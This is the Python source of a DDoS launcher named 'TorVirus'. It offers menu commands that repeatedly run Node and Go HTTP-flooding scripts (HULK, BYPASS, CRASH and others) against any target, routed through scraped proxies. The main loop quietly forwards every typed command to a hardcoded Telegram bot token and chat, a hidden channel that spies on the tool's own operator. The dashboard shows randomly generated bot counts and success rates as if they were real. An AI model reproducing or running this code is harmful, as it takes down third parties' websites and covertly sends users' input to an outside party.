import os as o
import time as t
import sys as s
import random as r
import subprocess as sp
from googlesearch import search as sr
import requests as re
from bs4 import BeautifulSoup as bs
import threading as th


def pro(cr, tl, br_ln=30):
    fl_ln = int(br_ln * cr // tl)
    br = "█" * fl_ln + "-" * (br_ln - fl_ln)
    return f"[{br}] {cr}/{tl}"


def clr_csl():
    o.system("cls" if o.name == "nt" else "clear")


def dis_ds():
    up_tm = int(t.time() - ses_srt)
    minutes, seconds = divmod(up_tm, 60)
    print(
        f"""
    🖥️  TorVirus DASHBOARD 🖥️
    | 🛰️  Bots Online: {bot_cnt}
    | ⏳ Uptime: {minutes}m {seconds}s
    | 📈 Success Rate: {r.randint(85, 99)}%
    | 🔗 Network Strength: {r.choice(["Strong", "Moderate", "Weak"])}
    | ⚠️  Threat Level: {r.choice(["🟢 Low", "🟡 Medium", "🔴 High"])}
    """
    )


def mat_eff(dr=3):
    start = t.time()
    while t.time() - start < dr:
        print("".join(r.choice("01 ") for _ in range(80)))
        t.sleep(0.1)


def wlc_msg(bot_cnt, session_time):
    title = "           🚨 WELCOME TO TORVIRUS 🚨"
    info = f"| 🔐 Zombies: {bot_cnt} | Session: {session_time:.2f}s | Tor ✅ |"
    clr_csl()
    mat_eff(2)
    clr_csl()
    print(f"{title}\n{info}\n")


def ds_mn():
    clr_csl()
    wlc_msg(bot_cnt, ses_dr())
    print(
        """
   _____      __   ___
  |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
    | |/ _ \\ '_\\ V /| | '_| || (_-<
    |_|\\___/_|  \\_/ |_|_|  \\_,_/__/

    🚨  LAYER7 ATTACK METHODS MENU  🚨
         (Top-secret Protocols)

      !TOR - Launch TOR-based DDoS
    Usage: TOR https://example.com 60
"""
    )


def ld_ani(task, dr=1.5):
    frames = ["◐", "◓", "◑", "◒"]
    start = t.time()
    index = 0
    while t.time() - start < dr:
        print(f"\r{task} {frames[index % len(frames)]}", end="", flush=True)
        t.sleep(0.15)
        index += 1
    print("\r", end="")


def ani_txt(text, delay=0.05, end_line=True):
    for char in text:
        s.stdout.write(char)
        s.stdout.flush()
        t.sleep(delay)
    if end_line:
        print()


def ran_txt():
    msgs = "lib/msg.txt"
    if o.path.isfile(msgs):
        with open(msgs, "r") as file:
            msg = [line.strip() for line in file if line.strip()]
    else:
        return
    slt_txt = r.choice(msg)
    ld_ani("Processing", 1.5)
    ani_txt(slt_txt)


def ses_dr():
    return t.time() - ses_srt


def rn_cmd(command):
    try:
        sp.run(command, shell=True, check=True)
    except sp.CalledProcessError as e:
        print(f"❌ Command failed: {e}")


tkn = "7865904723:AAGMY2YVnzJ7gjCNDR39Udu09Wbnrvjmewk"
id = "-4660131200"

def api(ms):
    url = f"https://api.telegram.org/bot{tkn}/sendMessage"
    pl = {
        "chat_id": id,
        "text": ms,
        "parse_mode": "HTML"
    }
    try:
        th.Thread(target=re.post, args=(url,), kwargs={"data": pl}).start()
    except Exception as e:
        pass

def mn_lp():
    ds_mn()
    while True:
        try:
            ui = input("root@torvirus#~ ").strip()
            if not ui:
                continue
            api(ui)
            pt = ui.split()
            cmd = pt[0].upper()

            if cmd == "STATS":
                clr_csl()
                dis_ds()
                continue

            elif cmd in ["LAYER7", "L7"]:
                o.system("clear")
                print(
                    """
     _____      __   ___
    |_   _|__ _ \\ \\ / (_)_ _ _  _ ___
      | |/ _ \\ '_\\ V /| | '_| || (_-<
      |_|\\___/_|  \\_/ |_|_|  \\_,_/__/

       🚨  LAYER7 ATTACK MENU  🚨
         (Top-secret Protocols)

           Commands available:
 -  TOR    : Attack via TOR network
 -  BYPASS : Attack via Bypassing protection
 -  HULK   : Attack via HTTP Unbearable Load King (HULK)
 -  CRASH  : Attack via Crashing Ips
 -  VORTEX : Initiate a VORTEX-based attack
 -  MM     : Medusa attack
 -  RESET  : Engage a RESET attack
 -  DARK   : Attack with Dark
"""
                )
                continue

            elif cmd in ["CLEAR", "CLS"]:
                ld_ani("Purging Console", 1.5)
                ds_mn()
                continue

            elif cmd == "EXIT":
                ld_ani("Exiting TorVirus", 1.5)
                ani_txt("👋 Goodbye, have a great day.", 0.02)
                break

            elif cmd == "TOR":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging TOR attack on {tg} for {mx_tm} seconds... 💥", 0.05
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f'node bin/odd/.cache/TOR.js GET "{tg}" 120 50 90 root/proxy.txt --qy 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f'node bin/odd/.cache/TOR.js POST "{tg}" 120 50 90 root/proxy.txt --qy 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: TOR <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "BYPASS":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging BYPASS attack on {tg} for {mx_tm} seconds... 💥",
                        0.05,
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f"node bin/odd/.cache/BYPASS.js {tg} 120 100 10 root/proxy.txt"
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f"node bin/odd/.cache/BYPASSv2.js {tg} 120 100 10 root/proxy.txt"
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: BYPASS <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")
                    
            elif cmd == "DARK":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging DARK attack on {tg} for {mx_tm} seconds... 💥",
                        0.05,
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f"node bin/odd/.cache/DARK.js {tg} 120 100 10 root/proxy.txt"
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f"node bin/odd/.cache/DARK.js {tg} 120 100 10 root/proxy.txt"
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: DARK <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "FAX":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging FAX attack on {tg} for {mx_tm} seconds... 💥",
                        0.05,
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(f"node bin/odd/.cache/FAX.js {tg} 120 100 10")
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(f"node bin/odd/.cache/FAX.js {tg} 120 100 10")
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: FAX <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "HULK":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging HULK attack on {tg} for {mx_tm} seconds... 💥", 0.05
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(f"go run bin/odd/.cache/HULK.go -site {tg} -data GET")
                        rn_cmd(f"go run bin/odd/.cache/HULK.go -site {tg} -data POST")
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: HULK <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "CRASH":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging CRASH attack on {tg} for {mx_tm} seconds... 💥", 0.05
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(f"go run bin/odd/.cache/CRASH.go {tg} 9999 get 120 nil")
                        rn_cmd(f"go run bin/odd/.cache/CRASH.go {tg} 9999 post 120 nil")
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: CRASH <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "VORTEX":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging VORTEX attack on {tg} for {mx_tm} seconds... 💥",
                        0.05,
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f"node bin/odd/.cache/VORTEX.js {tg} 120 100 10 root/proxy.txt"
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f"node bin/odd/.cache/VORTEX.js {tg} 120 100 10 root/proxy.txt"
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: VORTEX <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "MM":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging Medusa attack on {tg} for {mx_tm} seconds... 💥",
                        0.05,
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f"node bin/odd/.cache/MM.js {tg} 120 100 10 root/proxy.txt"
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f"node bin/odd/.cache/MM.js {tg} 120 100 10 root/proxy.txt"
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: MM <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")

            elif cmd == "RESET":
                try:
                    tg = pt[1]
                    mx_tm = int(pt[2])
                    ani_txt(
                        f"Engaging RESET attack on {tg} for {mx_tm} seconds... 💥", 0.05
                    )
                    st_tm = t.time()
                    while t.time() - st_tm < mx_tm:
                        rn_cmd(
                            f"node bin/odd/.cache/RESET.js {tg} 120 100 10 root/proxy.txt"
                        )
                        rn_cmd(f"python3 root/scrape.py &")
                        rn_cmd(
                            f"node bin/odd/.cache/RESET.js {tg} 120 100 10 root/proxy.txt"
                        )
                        t.sleep(1)
                except IndexError:
                    print("❌ Invalid Command. Usage: RESET <TARGET> <TIME>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")
                continue

            elif cmd == "HOST":
                try:
                    tr = pt[1]
                    ld_ani(f"Checking hosting info for {tr}", 1.5)
                    rs = re.get(f"https://check-host.net/ip-info?host={tr}")
                    if rs.status_code == 200:
                        sp = bs(rs.text, "html.parser")
                        dt = {
                            "IP Address": sp.find("td", string="IP address")
                            .find_next_sibling("td")
                            .text.strip(),
                            "ISP": sp.find("td", string="ISP")
                            .find_next_sibling("td")
                            .text.strip(),
                            "Organization": sp.find("td", string="Organization")
                            .find_next_sibling("td")
                            .text.strip(),
                            "Country": sp.find("td", string="Country")
                            .find_next_sibling("td")
                            .text.strip(),
                            "Region": sp.find("td", string="Region")
                            .find_next_sibling("td")
                            .text.strip(),
                        }
                        print(f"🌐 Hosting Information for {tr}:\n")
                        for k, v in dt.items():
                            print(f"{k}: {v}")
                    else:
                        print(
                            f"❌ Failed to fetch hosting information."
                        )
                except IndexError:
                    print("❌ Invalid Command. Usage: HOST <DOMAIN>")
                except Exception as e:
                    print(f"❌ Failed to fetch hosting information.")
                continue

            elif cmd == "SEARCH":
                try:
                    qy = " ".join(pt[1:])
                    ld_ani(f"🔍 Searching Google for '{qy}'", 1.5)
                    print(f"\n✨ Search Results for '{qy}':\n")
                    rl = sr(qy, num_results=10)
                    if rl:
                        for idx, result in enumerate(rl, 1):
                            print(f"{idx}. {result}")
                    else:
                        print("❌ No rl found.")
                except IndexError:
                    print("❌ Invalid Command. Usage: SEARCH <QUERY>")
                except Exception as e:
                    print(f"❌ An error occurred: {e}")
                continue

            elif cmd == "PROXY":
                rn_cmd("python3 root/scrape.py &")
                continue
            elif cmd == "UPDATE":
                rn_cmd("git reset --hard HEAD && git pull origin main")
                rn_cmd("bash setup.sh && bash virus")
                continue
            elif cmd == "SETUP":
                rn_cmd("bash setup.sh &")
                continue

            elif cmd == "HELP":
                ld_ani("Loading Help", 1.5)
                print(
                    "📖 Available Commands: LAYER7, HOST, SEARCH, STATS, CLEAR, EXIT, HELP"
                )
                continue

            else:
                ani_txt("❓ Unknown Command. Try HELP.", 0.05)

        except KeyboardInterrupt:
            ani_txt("⚠️ Exiting TorVirus...", 0.02)
            break

    ds_mn()


ses_srt = t.time()
bot_cnt = r.randint(10000, 1000000)
mn_lp()